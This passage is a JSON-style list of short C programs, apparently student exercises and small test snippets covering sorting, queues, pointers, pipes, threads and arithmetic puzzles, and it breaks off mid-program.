    "#include <stdio.h>\nint b = 0x57202c6f;\nstatic int d = 0x00000a21;\nint main(void){\n    int c = 0x646c726f;\n    static int a = 0x6c6c6548;\n    char s[16];\n    *((int *)s) = a;\n    *((int *)(s + 4)) = b;\n    *((int *)(s + 8)) = c;\n    *((int *)(s + 12)) = d;\n    printf(\"%s\", s);\n    return 0;\n}",
    "int main (int argc, char **argv)\n{\n  char buf[10];\n  char c[] = \"%i\";\n  unsigned char uc[] = \"%i\";\n  const char cc[] = \"%i\";\n  const unsigned char cuc[] = \"%i\";\n  __builtin_sprintf(buf, (char *)c, 1);\n  __builtin_sprintf(buf, (char *)uc, 1);\n  __builtin_sprintf(buf, (char *)cc, 1);\n  __builtin_sprintf(buf, (char *)cuc, 1);\n  __builtin_sprintf(buf, (const char *)L\"foo\");\n  return 0;\n}",
    "#include<stdio.h>\ndouble cel_to_far(double C)\n{\n    double sabit1 = 1.8;\n    int sabit2 = 32;\n    int farhenit = (C * sabit1) + sabit2;\n    return farhenit;\n}\nint main(int argc, char const *argv[])\n{\n    double C;\n    printf(\"C giriniz: \");\n    scanf(\"%lf\",&C);\n    double c = cel_to_far(C);\n    printf(\"%0.2lf F\",c);\n}",
    "#include <math.h>\n#include <stdio.h>\nint main() {\n  printf(\"%1.6f, %1.6f, %1.6f, %1.6f, %1.6f, %1.6f\\n\", erf(1.0), erf(3.0),\n         erf(-1.0), erfc(1.0), erfc(3.0), erfc(-1.5));\n  return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\nvoid writer (const char* message, int count, FILE* stream)\n{\n  for (; count > 0; --count) {\n    fprintf (stream, \"%s\\n\", message);\n    fflush (stream);\n    sleep (1);\n  }\n}\nvoid reader (FILE* stream)\n{\n  char buffer[1024];\n  while (!feof (stream)\n  && !ferror (stream)\n  && fgets (buffer, sizeof (buffer), stream) != ((void*)0))\n    fputs (buffer, (stdout));\n}\nint main ()\n{\n  int fds[2];\n  pid_t pid;\n  pipe (fds);\n  pid = fork ();\n  if (pid == (pid_t) 0) {\n    FILE* stream;\n    close (fds[1]);\n    stream = fdopen (fds[0], \"r\");\n    reader (stream);\n    close (fds[0]);\n  }\n  else {\n    FILE* stream;\n    close (fds[0]);\n    stream = fdopen (fds[1], \"w\");\n    writer (\"Hello, world.\", 5, stream);\n    close (fds[1]);\n  }\n  return 0;\n}",
    "#include <ctype.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\nchar *hex2str(char *hex)\n{\n int ishex = 0, num;\n int *chars;\n char *ptr;\n char *tmp;\n tmp = strdup(hex);\n if (!tmp)\n  return hex;\n ptr = strtok(tmp, \":\");\n while (ptr) {\n  num = strtoul(ptr, ((void*)0), 16);\n  if (!(0 ? isprint(num) : ((unsigned)(num)-0x20) < 0x5f)) {\n   ishex = 0;\n   break;\n  }\n  ishex = 1;\n  sprintf(ptr, \"%c\", num);\n  if (ptr != tmp)\n   strcat(tmp, ptr);\n  ptr = strtok(((void*)0), \":\");\n }\n if (ishex)\n  strcpy(hex, tmp);\n free(tmp);\n return hex;\n}\nint main(int argc, char *argv[])\n{\n char *tmp;\n if (argc < 2)\n  return 1;\n tmp = strdup(argv[1]);\n if (tmp) {\n  printf(\"HEX: %s\\n\", tmp);\n  printf(\"STR: %s\\n\", hex2str(tmp));\n  free(tmp);\n }\n return 0;\n}",
    "#include <stdio.h>\nint calculateTriangularNumber (int n)\n{\n    int i, triangularNumber = 0;\n    for(i = 1; i <= n; ++i)\n    triangularNumber += i;\n    return triangularNumber;\n}\nint main(int argc, char const *argv[])\n{\n    int calculateTriangularNumber (int n);\n    int number;\n    {\n        printf(\"What triangular number do you want? \");\n            scanf(\"%d\", &number);\n                  printf (\"Triangular number %i is %i\\n\\n\", number, calculateTriangularNumber(number));\n    return 0;\n    }\n}",
    "#include <stdio.h>\nint main(void) {\n  double array[3];\n  double readValue = 0.0;\n  int cellNumber = 0;\n  int i = 0;\n  for (i = 0; i < 3; i++) {\n    printf(\"Enter a decimal value:\");\n    scanf(\"%lf\", &readValue);\n    array[cellNumber] = readValue;\n    printf(\"Cell number %d contains %.2lf\\n\", cellNumber, array[cellNumber]);\n    cellNumber = cellNumber + 1;\n  }\n  return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(int argc, char *argv[])\n{\n int max;\n void gen(int,int);\n max = (argc < 2) ? 63 : atoi(argv[1]);\n gen(1,max);\n return 0;\n}\nvoid gen(int lo, int hi)\n{\n if (lo > hi) return;\n int mid = (lo+hi)/2;\n printf(\"%d\\n\",mid);\n gen(lo,mid-1);\n gen(mid+1,hi);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nchar *readText(char *fileName) {\n  FILE *file = fopen(fileName, \"r\");\n  fseek(file, 0, (2));\n  int size = ftell(file);\n  char *text = malloc(size+1);\n  fseek(file, 0, (0));\n  fread(text, sizeof(char), size, file);\n  text[size] = '\\0';\n  fclose(file);\n  return text;\n}\nint main(int argc, char *argv[]) {\n  char *text = readText(argv[1]);\n  printf(\"%s\\n\", text);\n  free(text);\n}",
    "#include <stdlib.h>\n#include <limits.h>\n#include <string.h>\n#include <ctype.h>\n#include <stdio.h>\nint main(void)\n{\n    char hashTable[(127*2 +1)] = { 0 };\n    char c = '\\0';\n    int isInputValid = 0;\n    int count = 0;\n    while (1)\n    {\n        isInputValid = 0;\n        printf(\"Please enter a number (or 0 to terminate the program): \");\n        while (!isInputValid)\n        {\n            isInputValid = 1;\n            count = 0;\n            memset(hashTable, 0, (127*2 +1) * sizeof(char));\n            while ( (c = getchar()) != '\\n' && c != (-1)) {\n                if (!(0 ? isdigit(c) : ((unsigned)(c)-'0') < 10)) {\n                    isInputValid = 0;\n                } else {\n                    hashTable[c] += 1;\n                    ++count;\n                }\n            }\n            if (!isInputValid) {\n                fprintf((stderr), \"Not a valid number. Please try again.\\n\");\n            }\n        }\n        if (count == 1 && hashTable['0'] == 1) {\n            break;\n        }\n        printf(\"Repeated digits: \");\n        for (unsigned int i = 0; i < (127*2 +1); ++i) {\n            if (hashTable[i] > 1) {\n                printf(\"%c \", i);\n            }\n        }\n        putchar('\\n');\n    }\n    getchar();\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,j,k, term;\n    scanf(\"%d\", &term);\n    for(i=term; i>0; i--)\n    {\n        for(j=1; j<term-i+1; j++)\n        {\n            printf(\"* \");\n        }\n        for(k=i; k>0; k--)\n        {\n            printf(\"%d \",k);\n        }\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\nint main(void)\n{\n    printf(\"\\352\\224\\205    O_o\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nvoid mergeSort(int data[], int p, int r);\nvoid merge(int data[], int p, int q, int r);\nint main() {\n     int data[8] = {5,8,4,7,1,3,2,6} , i;\n     for(i = 0; i < 8; i++) {\n         printf(\"%d \", data[i]);\n     }\n     mergeSort(data, 0, 7);\n     for(i = 0; i < 8; i++) {\n         printf(\"%d \", data[i]);\n     }\n  return 0;\n}\nvoid mergeSort(int data[], int p, int r) {\n    int q;\n    if(p<r) {\n        q = (p+r)/2;\n        mergeSort(data, p , q);\n        mergeSort(data, q+1, r);\n        merge(data, p, q, r);\n    }\n}\nvoid merge(int data[], int p, int q, int r) {\n    int i = p, j = q+1, k = p;\n    int tmp[8];\n    while(i<=q && j<=r) {\n        if(data[i] <= data[j]) tmp[k++] = data[i++];\n        else tmp[k++] = data[j++];\n    }\n    while(i<=q) tmp[k++] = data[i++];\n    while(j<=r) tmp[k++] = data[j++];\n    for(int a = p; a<=r; a++) data[a] = tmp[a];\n}",
    "#include <stdio.h>\nint main(){\n    int val = 5;\n    int *ptr = &val;\n    printf(\"&val = %p\\n\", &val);\n    printf(\"ptr = %p\\n\", ptr);\n    printf(\"*ptr = %d\\n\", *ptr);\n    printf(\"*ptr + 1 = %d\\n\", *ptr);\n    printf(\"*(ptr + 1) = %d\\n\", *(ptr + 1));\n    printf(\"*&ptr = address of val variable = %p\\n\", *&ptr);\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nvoid enqueue(int n,int *a);\nvoid dequeue(int n,int *a);\nvoid pr(int n,int *a);\nint n,o,item,i;\nint front = -1,rear=-1;\nint main()\n{\n printf(\"Please enter size of queue\\t\");\n scanf(\"%d\",&n);\n int a[n];\n while(1)\n {\n  printf(\"\\nMenu for Queue\\n1.Enqueue\\n2.Dequeue\\n3.Print\\n4.Exit\\n\");\n  printf(\"Please enter the option\\t\");\n  scanf(\"%d\",&o);\n  switch(o)\n  {\n  case 1:\n    printf(\"\\nSelected Enqueue\\n\");\n    enqueue(n,&a[n]);\n    break;\n  case 2:\n    printf(\"\\nSelected Dequeue\\n\");\n    dequeue(n,&a[n]);\n    break;\n  case 3:\n    pr(n,&a[n]);\n    break;\n  case 4: exit(0);break;\n  default: printf(\"Please enter the correct value\\n\");break;\n  }\n }\n   return 0;\n}\nvoid enqueue(int n,int *a)\n{\n   if(rear==n-1)\n   {\n    printf(\"\\nSituation:Queue is Full\\n\");\n   }\n   else if(front==-1)\n   {\n    front=0;\n    printf(\"Input element to be inserted\\t\");\n    scanf(\"%d\",&item);\n    rear++;\n    a[rear]=item;\n    printf(\"Item Inserted\\n\\n\");\n   }\n   else if(rear<n)\n   {\n    printf(\"Input element to be inserted\\t\");\n    scanf(\"%d\",&item);\n    rear++;\n    a[rear]=item;\n    printf(\"Item Inserted\\n\\n\");\n   }\n}\nvoid dequeue(int n,int *a)\n{\n   if(rear==-1)\n   {\n    printf(\"\\nSituation:Queue Empty\\n\");\n   }\n   else if(front==rear)\n   {\n    printf(\"%d Deleted\\n\\n\",a[front]);\n    front=-1;\n    rear=-1;\n   }\n   else\n   {\n    printf(\"%d Deleted\\n\\n\",a[front]);\n    front++;\n   }\n}\nvoid pr(int n,int *a)\n{\n   if(rear == -1)\n   {\n    printf(\"\\nEmpty Queue\\n\");\n   }\n   printf(\"\\nElements in Queue\\n\");\n   for(i=front;i<=rear;i++)\n   {\n    printf(\"%d\\n\",a[i]);\n   }\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(void) {\n    int N, S, c, i, j, X;\n    char D[51];\n    char A[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n    scanf(\"%d\", &N);\n    for (c = 0; c < N; c++)\n    {\n        scanf(\"%s\", D);\n        scanf(\"%d\", &S);\n        i = 0;\n        while (i < strlen(D))\n        {\n            j = 0;\n            X = D[i];\n            while (X != A[j])\n            {\n                j++;\n            }\n            if (j - S >= 0)\n            {\n                X = A[j - S];\n                D[i] = X;\n            }\n            else\n            {\n                X = A[strlen(A) - (S - j)];\n                D[i] = X;\n            }\n            i++;\n        }\n        printf(\"%s\\n\", D);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int base;\n    int altura;\n    int area;\n    printf(\"Digite o valor da base:\");\n    scanf(\"%i\", &base);\n    printf(\"Digite o valor da altura:\");\n    scanf(\"%i\", &altura);\n    area = base*altura;\n    printf(\"O valor da area do retangulo e = %i\", area);\n    getchar();\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <string.h>\nvoid game(int rounds){\n    int AIScore = 0;\n    int playerScore = 0;\n    for(int i = 0; i < rounds; i++){\n        printf(\"Which do you choose? rock, paper, or scissors? \");\n        char input[50];\n        scanf(\"%s\",input);\n        printf(\"\\n\");\n        int inputSum = 0;\n        for (int j = 0; input[j] != '\\0'; j++){\n            inputSum += input[j];\n        }\n        int randomNum;\n        srand(time(0));\n        randomNum = (rand() % (3-0+1))+0;\n        int gamePlay;\n        while(randomNum < 4){\n            if(randomNum == 0 || randomNum == 2 || randomNum == 3){\n                break;\n            }\n            else{\n                srand(time(0));\n                randomNum = (rand() % (3-0+1))+0;\n            }\n        }\n        if(randomNum == 0){\n            char AI[50] = \"rock\";\n            printf(\"AI chose %s\\n\", AI);\n            gamePlay = strcmp(AI,input);\n        }\n        else if(randomNum == 2){\n            char AI[50] = \"paper\";\n            printf(\"AI chose %s\\n\", AI);\n            gamePlay = strcmp(AI,input);\n        }\n        else if (randomNum == 3){\n            char AI[50] = \"scissors\";\n            printf(\"AI chose %s\\n\", AI);\n            gamePlay = strcmp(AI,input);\n        }\n        if(inputSum == 431 || inputSum == 536 || inputSum == 889){\n           if(gamePlay == -1 || gamePlay == 3 || gamePlay == -2){\n                AIScore = AIScore + 1;\n            }\n            else if(gamePlay == -3 || gamePlay == 2 || gamePlay == 1){\n                playerScore = playerScore + 1;\n             }\n        }\n        else{\n           printf(\"You entered an invalid choice: %s\\n\", input);\n        }\n        printf(\"AI Score: %d , Player Score: %d\\n\",AIScore, playerScore);\n    }\n    if(AIScore > playerScore){\n        printf(\"AI wins!\\n\");\n    }\n    else if(AIScore < playerScore){\n        printf(\"Player wins!\\n\");\n    }\n    else{\n        printf(\"It's a tie!\\n\");\n    }\n}\nint main() {\n    printf(\"Welcome to Rock, Paper, Scissors!\\n\");\n    printf(\"How many rounds do you want play? \");\n    int rounds;\n    scanf(\"%d\",&rounds);\n    game(rounds);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n  int T,i,H,M,h,m;\n  scanf(\"%d\", &T);\n  while(T--){\n        scanf(\"%d\",&H);\n        scanf(\"%c\",&h);\n        scanf(\"%d\",&M);\n        if(H==12&&M==0){\n            printf(\"%.2d:%.2d\\n\",H,M);\n        }\n        else if(H==12&&M>0){\n            printf(\"%.2d:%.2d\\n\",H-1,60-M);\n        }\n        else if(H==11&&M>0){\n            printf(\"%.2d:%.2d\\n\",H+1,60-M);\n        }\n        else if(H>0&&M==0){\n            printf(\"%.2d:%.2d\\n\",12-H,M);\n        }\n        else if(H>0&&M>0){\n            printf(\"%.2d:%.2d\\n\",12-H-1,60-M);\n        }\n    }\n  return 0;\n}",
    "#include <stdio.h>\nvoid SomaVetores (float vet1[], float vet2[], float vet3[], int tam){\n  for (int i = 0; i < tam; i++){\n    vet3[i] = vet1[i] + vet2[i];\n    printf (\"%.1f \", vet3[i]);\n}\n  }\nint main() {\n  int tam;\n  float vet1[tam], vet2[tam], vet3[tam];\n  scanf (\"%d\", &tam);\n  printf (\"Digite os valores do vetor 1: \");\n  for (int i = 0; i < tam; i++){\n    scanf (\"%f\", &vet1[i]);\n  }\n  printf (\"Digite os valores do vetor 2: \");\n  for (int i = 0; i < tam; i++){\n    scanf (\"%f\", &vet2[i]);\n  }\n  SomaVetores (vet1, vet2, vet3, tam);\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <stdlib.h>\nvoid print_chessboard();\nint main()\n{\n  print_chessboard();\n}\nvoid print_chessboard()\n{\n  int i, j;\n  for(i=0; i<10; i++)\n  {\n    if(i%2==1)\n      printf(\" \");\n    for(j=0; j<10; j++)\n      printf(\"*\");\n    printf(\"\\n\");\n  }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n int a=12,b=7;\n int *ptr;\n ptr=&a;\n printf(\"ptr=&a\\ta=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\",a,b,ptr,*ptr);\n *ptr=19;\n printf(\"*ptr=19\\ta=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\",a,b,ptr,*ptr);\n ptr=&b;\n printf(\"ptr=&b\\ta=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\",a,b,ptr,*ptr);\n b=16;\n printf(\"b=16\\ta=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\",a,b,ptr,*ptr);\n *ptr=12;\n printf(\"*ptr=12\\ta=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\",a,b,ptr,*ptr);\n a=17;\n printf(\"a=17\\ta=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\",a,b,ptr,*ptr);\n ptr=&a;\n printf(\"ptr=&a\\ta=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\",a,b,ptr,*ptr);\n a=b;\n printf(\"a=b\\ta=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\",a,b,ptr,*ptr);\n *ptr=63;\n printf(\"*ptr=63\\ta=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\\n\",a,b,ptr,*ptr);\n printf(\"a=%d\\tb=%d\\tptr=%p\\t*ptr=%d\\n\",a,b,ptr,*ptr);\n system(\"pause\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int my_int = 2;\n    if (my_int == 2)\n        printf(\"my_int == 2\\n\");\n    if (my_int = 5)\n        printf(\"my_int =  5: %d\\n\", my_int);\n    if (my_int = 0)\n        printf(\"my_int =  0: %d\\n\", my_int);\n    if (my_int == 0)\n    {\n        printf(\"my_int == 0\\n\");\n        printf(\"Another statement!\\n\");\n    }\n    else if (my_int == 1)\n        printf(\"You should not see this message.\\n\");\n    else\n        printf(\"Nor should you see this one!\\n\");\n    if (my_int == 0 || my_int == 8)\n    {\n        printf(\"my_int == 0 or my_int == 8\\n\");\n    }\n    if (my_int != 0 && (8 / my_int) > 3)\n    {\n        printf(\"You will never see me.\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int argc, char * argv[]) {\n    if (argc < 3) {\n        printf(\"Usage...what ever.\\n\");\n        exit(1);\n    }\n    char * str = argv[1];\n    char * file = argv[2];\n    FILE * fp;\n    if ((fp = fopen(file, \"r\")) == ((void*)0)) {\n        fprintf((stderr), \"I couldn't open the file \\\"%s\\\"\\n\", file);\n        exit(1);\n    }\n    char line[255];\n    int index = 1;\n    while (fgets(line, 255, fp) != ((void*)0)) {\n        if (strstr(line, str) != ((void*)0)) {\n            printf(\"include %d\\n\", index);\n        }\n        index++;\n    }\n    fclose(fp);\n    return 0;\n}",
    "typedef union {\n    int test;\n} myunion;\nvoid fn_call(myunion* t)\n{\n}\nint main()\n{\n    int i = 1;\n    fn_call((myunion*)&i);\n    return 0;\n}",
    "#include <stdio.h>\nvoid test_function(int ara[]) {\n ara[0] = 100;\n return;\n}\nint main() {\n int ara[] = {1, 2, 3, 4, 5};\n printf(\"%d\\n\", ara[0]);\n test_function(ara);\n printf(\"%d\\n\", ara[0]);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n   for(int i = 0; i < 256; i++)\n   {\n      printf(\"%i: %c\\n\", i, i);\n   }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n#include <unistd.h>\n\nvoid *PrintHello(void *threadid) {\n   long tid;\n   tid = (long)threadid;\n   sleep(1);\n   printf(\"thread %ld: printing\\n\", tid);\n   sleep(15);\n   pthread_exit(((void*)0));\n}\nint main () {\n   pthread_t threads[10];\n   int rc;\n   int i;\n   for(i = 0; i < 10; i++) {\n      printf(\"main() : creating thread: %d\\n\", i+1);\n      rc = pthread_create(&threads[i], ((void*)0), PrintHello, (void *) (size_t) i+1);\n      if (rc) {\n         printf(\"Error: unable to create thread: %d\\n\", rc);\n         exit(-1);\n      }\n   }\n   pthread_exit(((void*)0));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main () {\n   int val;\n   char str[20];\n   strcpy(str, \"98993489\");\n   val = atoi(str);\n   printf(\"String value = %s, Int value = %d\\n\", str, val);\n   strcpy(str, \"easy c \");\n   val = atoi(str);\n   printf(\"String value = %s, Int value = %d\\n\", str, val);\n   return(0);\n}",
    "#include <stdio.h>\n\n\n void ler_matriz(int mat[][10], int x, int y)\n {\n  int i, j;\n  for (i=0; i<x; i++)\n  {\n   for (j=0; j<y; j++)\n   {\n    scanf(\"%d\", &mat[i][j]);\n   }\n  }\n }\n void soma_matrizes(int matx[][10], int maty[][10], int matz[][10], int x, int y)\n {\n  int i, j;\n  for (i=0; i<x; i++)\n  {\n   for (j=0; j<y; j++)\n   {\n    matz[i][j]=matx[i][j]+maty[i][j];\n   }\n  }\n }\n void print_matriz_r(int matz[][10], int x, int y)\n {\n  int i, j;\n  for (i=0; i<x; i++)\n  {\n   for (j=0; j<y; j++)\n   {\n    printf(\"%d \", matz[i][j]);\n    if (j==y-1)\n    {\n     printf(\"\\n\");\n    }\n   }\n  }\n }\n int main()\n {\n  int matx[10][10];\n  int maty[10][10];\n  int matz[10][10];\n  int linha, coluna;\n  printf(\"Digite um valor para linha: \");\n  scanf(\"%d\", &linha);\n  if (linha>=10)\n  {\n   while(linha>=10)\n   {\n   printf(\"Digite um valor valido(ate 10): \");\n   scanf(\"%d\", &linha);\n   }\n  }\n  printf(\"Digite um valor para coluna: \");\n  scanf(\"%d\", &coluna);\n  if (coluna>=10)\n  {\n   while (coluna>=10)\n   {\n   printf(\"Digite um valor valido(ate 10): \");\n   scanf(\"%d\", &coluna);\n   }\n  }\n  ler_matriz(matx,linha,coluna);\n  printf(\"\\n\");\n  ler_matriz(maty,linha,coluna);\n  printf(\"\\n\");\n  soma_matrizes(matx,maty,matz, linha, coluna);\n  print_matriz_r(matz, linha, coluna);\n }",
    "#include <stdio.h>\n\nconst unsigned int units[] ={500, 100, 50, 10, 5, 1};\n\n\nint main(void)\n{\n unsigned int i, accounting, buffer;\n unsigned int count[10];\n puts(\"\u652f\u6255\u984d\u304b\u3089\u6700\u4f4e\u5fc5\u8981\u306a\u786c\u8ca8\u306e\u679a\u6570\u3092\u8a08\u7b97\u3057\u307e\u3059\");\n printf(\"\u652f\u6255\u984d\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044(1 ... %d)\\n\", 1000 -1);\n do\n {\n  printf(\"> \");\n  scanf(\"%u\", &accounting);\n  if(accounting<=0 || accounting>=1000)\n   printf(\"%u\u306f\u7121\u52b9\u306a\u5024\u3067\u3059\u30021 ... %d\u306e\u7bc4\u56f2\u5185\u3067\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\\n\", accounting, 1000 -1);\n } while(accounting<=0 || accounting>=1000);\n printf(\"\u652f\u6255\u91d1\u984d: %u\", accounting);\n for (i= 0; i<(sizeof(units)/sizeof(units[0])); ++i)\n {\n  if(units[i]==0)\n  {\n   printf(\"\u4f7f\u7528\u3059\u308b\u786c\u8ca8\u306b\u554f\u984c\u304c\u898b\u3064\u304b\u308a\u307e\u3057\u305f\u3002\\n\u4f7f\u7528\u3059\u308b\u786c\u8ca8\u306e\u518d\u78ba\u8a8d\u3092\u884c\u3063\u3066\u304f\u3060\u3055\u3044\u3002\");\n   return -1;\n  }\n  else\n  {\n   buffer= accounting % units[i];\n   count[i]= (accounting - buffer) / units[i];\n   accounting= buffer;\n  }\n  if(accounting==0)\n   break;\n }\n if(accounting==0)\n {\n  puts(\"\u652f\u6255\u3044\u306b\u5fc5\u8981\u306a\u786c\u8ca8\u306e\u679a\u6570\");\n  buffer= 0;\n  for(i=0; i<(sizeof(units)/sizeof(units[0])); i++)\n  {\n   printf(\"%u\u5186\u7389: %u\u679a\\n\", units[i], count[i]);\n   buffer+= count[i];\n  }\n  printf(\"\u5408\u8a08: %u\u679a\", buffer);\n  return 0;\n }\n else\n {\n  puts(\"\u652f\u6255\u91d1\u984d\u306b\u5bfe\u3057\u3001\u6307\u5b9a\u3055\u308c\u305f\u52b9\u679c\u306e\u7a2e\u985e\u3067\u306f\u5272\u308a\u5207\u308c\u307e\u305b\u3093\u3067\u3057\u305f\u3002\\n\u4f7f\u7528\u3059\u308b\u786c\u8ca8\u306e\u518d\u78ba\u8a8d\u3092\u884c\u3063\u3066\u304f\u3060\u3055\u3044\u3002\");\n  return -1;\n }\n}",
    "#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\nint main(int argc, char **argv) {\n  char buff[256];\n  memset(buff, 0, 256);\n  buff[0] = 'a';\n  printf(\"%s\\n\", buff);\n  return 0;\n}",
    "void f3(int *ptr_param2) {\n  *ptr_param2 = 0;\n}\nvoid f2(int *ptr_param) {\n  int *ptr2;\n  ptr2 = ptr_param;\n  f3(ptr2);\n}\nint main()\n{\n  int *ptr;\n  ptr = 0;\n  f2(ptr);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint addNumbers(int* numbers, int counter);\nint getNumbers(int* numbers);\nint main(){\n int values[10];\n int* numbers = values;\n int counter = getNumbers(numbers);\n int sum = addNumbers(numbers, counter);\n printf(\"%d\\n\", sum);\n}\nint getNumbers(int* numbers){\n printf(\"Enter up to 10 numbers to be added(Ctrl-D to compute):\\n\");\n int counter = 0;\n int DFlag = 0;\n do{\n  char input[10];\n  if (fgets(input, sizeof(input)+1,(stdin)) == ((void*)0)){\n   DFlag = 1;\n  }\n  else{\n   size_t len = strlen(input);\n   if(input[len-1] != '\\n'){\n    printf(\"Woah there boy scout, you entered too many digits. Try again.\\n\");\n   }\n   else if(counter > 9){\n    printf(\"Sorry bud, you can't enter any more numbers. Hit Ctrl-D to exit.\\n\");\n   }\n   else{\n    int thisNumber = atoi(input);\n    if(thisNumber == 0){\n     printf(\"Sorry bro, entering 0 or a string doesn't do anything, try again.\\n\");\n    }\n    else{\n     numbers[counter] = thisNumber;\n     counter++;\n    }\n   }\n  }\n } while(!DFlag);\n return counter;\n}\nint addNumbers(int* numbers, int counter){\n int i;\n int sum = 0;\n for(i = 0; i < counter; i++){\n  sum += numbers[i];\n }\n return sum;\n}",
    "#include <stdio.h>\n\n\nint main() {\n printf(\"Value of e is: %f\\n\", 2.718282);\n printf(\"Value of log(e) is: %f\", 0.434294);\n return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nint main(void) {\n printf(\"Guten Tag %d\\n\", fork());\n return 0;\n}",
    "#include <stdio.h>\nint contafreq(int num, int digito) {\n    if (num == 0) return 0;\n    int qtdDigitos = 0;\n    int numero = num;\n    while (numero != 0) {\n        numero = numero / 10;\n        qtdDigitos++;\n    }\n    int divisor = 1;\n    for (int i = 0; i < qtdDigitos-1; i++) {\n        divisor = divisor * 10;\n    }\n    if (digito == num / divisor)\n        return 1 + contafreq(num%divisor, digito);\n    else\n        return 0 + contafreq(num%divisor, digito);\n}\nint main() {\n    int contagem = contafreq(122322, 2);\n    printf(\"contagem = %d\\n\", contagem);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n\nint myStrlen(char *str)\n{\n    int i =0;\n    while(str[i++]);\n    return i-1;\n}\nchar* myStrRev(char *str)\n{\n    int i = 0;\n    int j = myStrlen(str)-1;\n    while(i<j)\n    {\n        char temp = str[i];\n        str[i] = str[j];\n        str[j] = temp;\n        i++;\n        j--;\n    }\n    return str;\n}\nchar* multiply(char* num1, char* num2)\n{\n    int n1 = myStrlen(num1);\n    int n2 = myStrlen(num2);\n    int shifter = 0;\n    char *val = (char *)calloc(sizeof(char),n1+n2+1);\n    int i,j;\n    for(j=n2-1;j>=0;j--)\n    {\n        int k = n1+n2 -1 - shifter;\n        int multipler = num2[j] - '0';\n        for(i=n1-1;i>=0;i--)\n        {\n            int temp = (multipler * (num1[i] - '0')) + (val[k] == '\\0'? 0 : val[k] - '0');\n            val[k--] = temp%10 + '0';\n            if(temp > 9)\n            {\n                val[k] = ((val[k] == '\\0'? 0 : val[k] - '0') + (temp/10)) + '0';\n            }\n        }\n        shifter++;\n    }\n    int nonNullIndex=0;\n    while(val[nonNullIndex] == '0' || val[nonNullIndex] == '\\0') nonNullIndex++;\n    return val+nonNullIndex;\n}\nchar* convertToString(int num)\n{\n    long int n = num;\n    int i=0,j=0;\n    while(n)\n    {\n        i++;\n        n/=10;\n    }\n    char* str = (char *)calloc(sizeof(char),i+1);\n    while(num)\n    {\n        str[j++] = num%10 + '0';\n        num /=10;\n    }\n    myStrRev(str);\n    return str;\n}\nchar* factorial(int n)\n{\n    char* result = \"1\";\n    int i;\n    for(i=1;i<=n;i++)\n    {\n        result = multiply(result,convertToString(i));\n    }\n    return result;\n}\nint main()\n{\n    int num = 0;\n    printf(\"Enter number for factorial: \");\n    scanf(\"%d\", &num);\n    printf(\"\\nfactorial of %d = %d! = %s\\n\\n\", num,num,factorial(num));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n int U0;\n int Unn;\n int Un;\n int tours=0;\n int i;\n int n;\n printf (\"Ecris un nombre : \");\n scanf(\"%d\",&n);\n for(i=0;i<n;i++){\n  printf(\"12\");\n  U0=i;\n  Un=U0;\n  while(Un!=1){\n   tours++;\n   if(Un%2==0){\n    Unn=Un/2;\n   }\n   else if(Un%2==1){\n    Unn=3*Un+1;\n   }\n   Un=Unn;\n  }\n printf(\"Pour %d il y a %d iterations.\\n\",i,tours);\n tours=0;\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nconst int pow10table[] =\n{\n    1, 10, 100, 1000, 10000, 100000, 1000000,\n    10000000, 100000000, 1000000000\n};\nint base10len(int n)\n{\n    int len = 0;\n    while (n) {\n        n /= 10;\n        ++len;\n    }\n    return len;\n}\nint prev_palindrome(const int n)\n{\n    int val = n - 1;\nrestart:;\n    int right = 0;\n    int left = base10len(val) - 1;\n    int thresh = pow10table[left];\n    while (left > right) {\n        int trailing = (val / pow10table[right]);\n        int leftdig = (val / pow10table[left]) % 10;\n        int rightdig = (val / pow10table[right]) % 10;\n        if (rightdig != leftdig) {\n            int sub = rightdig > leftdig\n                    ? (rightdig - leftdig) * pow10table[right]\n                    : (10 - (leftdig - rightdig)) * pow10table[right];\n                val = val - sub < thresh\n                    ? thresh - 1\n                    : val - sub;\n        }\n        if (val / pow10table[right] != trailing || val < thresh)\n            goto restart;\n        --left;\n        ++right;\n    }\n    return val;\n}\nint has3digitfactor(int n)\n{\n    int i;\n    for (i = 999; i > 99; --i) {\n        if ((n / i) > 999 || n > i*i)\n            return 0;\n        if (!(n % i))\n            return 1;\n    }\n    return 0;\n}\nint main(void)\n{\n    int s = 